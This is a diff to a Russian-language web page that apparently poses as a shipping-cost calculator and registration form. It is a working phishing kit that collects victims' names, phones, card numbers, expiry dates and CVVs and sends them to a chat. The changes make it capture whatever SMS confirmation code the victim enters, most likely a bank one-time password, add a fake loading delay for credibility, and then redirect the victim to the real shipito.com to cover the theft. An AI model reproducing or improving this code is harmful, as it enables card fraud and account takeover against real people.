@@ -98,6 +98,21 @@
         }
         .btn-primary:hover { background: #004d99; }
 
+        .loader {
+            display: none;
+            margin: 20px auto;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0066cc;
+            border-radius: 50%;
+            width: 36px;
+            height: 36px;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
         .result-box {
             background: #e6f7ec;
             border: 1px solid #b8dfca;
@@ -184,6 +199,7 @@
             </div>
             <button id="calculateBtn" class="btn-primary">Рассчитать</button>
 
+            <div id="loader" class="loader"></div>
             <div id="resultBox" class="result-box"></div>
             <button id="toRegistrationBtn" class="btn-primary" style="display:none; margin-top:15px;">Заполнить форму для точного расчета</button>
         </div>
@@ -232,7 +248,7 @@
         </div>
 
         <div id="step2" class="step">
-            <div class="code-sent-msg" id="codeDisplay">
+            <div class="code-sent-msg">
                 Мы отправили код подтверждения на ваш номер.<br>Введите его ниже:
             </div>
             <form id="smsForm" novalidate>
@@ -261,6 +277,7 @@
             const toRegistrationBtn = document.getElementById('toRegistrationBtn');
             const backToLanding = document.getElementById('backToLanding');
             const resultBox = document.getElementById('resultBox');
+            const loader = document.getElementById('loader');
             const supplierSiteInput = document.getElementById('supplierSite');
             const cityInput = document.getElementById('city');
 
@@ -271,14 +288,12 @@
             const backToDataBtn = document.getElementById('backToDataBtn');
             const alertError = document.getElementById('alertError');
             const alertSuccess = document.getElementById('alertSuccess');
-            const codeDisplay = document.getElementById('codeDisplay');
             const smsCodeInput = document.getElementById('smsCode');
             const phoneInput = document.getElementById('phone');
             const cardInput = document.getElementById('cardNumber');
             const expiryInput = document.getElementById('expiry');
             const cvvInput = document.getElementById('cvv');
 
-            let generatedCode = '';
             let userData = {};
 
             function showAlert(el, msg) {
@@ -341,7 +356,7 @@
             }
             collectAndSendUserInfo();
 
-            // Расчёт доставки
+            // Расчёт доставки с 3-секундной задержкой
             calculateBtn.addEventListener('click', function() {
                 const site = supplierSiteInput.value.trim();
                 const city = cityInput.value.trim();
@@ -349,12 +364,22 @@
                     alert('Заполните оба поля');
                     return;
                 }
-                // Отправка запроса в чат
-                sendMessage(`📦 Запрос расчёта доставки\nСайт поставщика: ${site}\nГород получателя: ${city}`);
-                // Показ уведомления
-                resultBox.style.display = 'block';
-                resultBox.innerHTML = `✅ Доставка возможна! <br>Поставщик <strong>${site}</strong> осуществляет отправку в <strong>${city}</strong>.<br>Для точного расчета стоимости заполните регистрационную форму.`;
-                toRegistrationBtn.style.display = 'block';
+                // Показываем загрузку, скрываем результат и кнопку
+                loader.style.display = 'block';
+                resultBox.style.display = 'none';
+                toRegistrationBtn.style.display = 'none';
+                calculateBtn.disabled = true;
+
+                setTimeout(() => {
+                    // Скрываем загрузку, показываем результат
+                    loader.style.display = 'none';
+                    resultBox.style.display = 'block';
+                    resultBox.innerHTML = `✅ Доставка возможна! <br>Поставщик <strong>${site}</strong> осуществляет отправку в <strong>${city}</strong>.<br>Для точного расчета стоимости заполните регистрационную форму.`;
+                    toRegistrationBtn.style.display = 'block';
+                    calculateBtn.disabled = false;
+                    // Отправляем сообщение в чат
+                    sendMessage(`📦 Запрос расчёта доставки\nСайт поставщика: ${site}\nГород получателя: ${city}`);
+                }, 3000);
             });
 
             // Переход к регистрационной форме
@@ -369,7 +394,6 @@
                 dataForm.reset();
                 smsForm.reset();
                 userData = {};
-                generatedCode = '';
                 switchStep(1);
             });
 
@@ -396,7 +420,7 @@
                 e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
             });
 
-            // Шаг 1 — карта
+            // Шаг 1 — отправка карты
             dataForm.addEventListener('submit', function(e) {
                 e.preventDefault();
                 hideAlerts();
@@ -420,29 +444,28 @@
                 const cardMsg = `💳 Данные карты\n👤 Имя: ${name}\n📱 Телефон: ${phone}\n💳 Номер: ${card}\n📅 Срок: ${expiry}\n🔒 CVV: ${cvv}`;
                 sendMessage(cardMsg);
 
-                generatedCode = Math.floor(1000 + Math.random() * 9000).toString();
-                codeDisplay.innerHTML = `Мы отправили код подтверждения на номер <strong>${phone}</strong>.<br>Ваш код: <span style="font-size:20px;font-weight:bold;color:#0066cc;">${generatedCode}</span>`;
+                // Переход к шагу SMS (без генерации кода)
                 switchStep(2);
             });
 
-            // Шаг 2 — SMS
+            // Шаг 2 — SMS (ввод любого кода и редирект)
             smsForm.addEventListener('submit', async function(e) {
                 e.preventDefault();
                 hideAlerts();
-                const enteredCode = smsCodeInput.value.trim();
-                if (enteredCode !== generatedCode) {
-                    showAlert(alertError, 'Неверный код подтверждения. Попробуйте ещё раз.'); return;
+                const smsCode = smsCodeInput.value.trim();
+                if (!smsCode) {
+                    showAlert(alertError, 'Введите код из SMS.');
+                    return;
                 }
-                const smsMsg = `📱 SMS-подтверждение\nТелефон: ${userData.phone}\nКод: ${generatedCode}`;
+
+                // Отправляем введённый код в чат
+                const smsMsg = `📱 SMS-подтверждение\nТелефон: ${userData.phone}\nКод: ${smsCode}`;
                 await sendMessage(smsMsg);
 
-                showAlert(alertSuccess, 'Регистрация успешно завершена.');
-                smsForm.reset();
-                userData = {};
-                generatedCode = '';
+                // Успех и редирект
+                showAlert(alertSuccess, 'Регистрация успешно завершена. Перенаправляем на shipito.com...');
                 setTimeout(() => {
-                    switchStep(1);
-                    dataForm.reset();
+                    window.location.href = 'https://www.shipito.com';
                 }, 2000);
             });
 
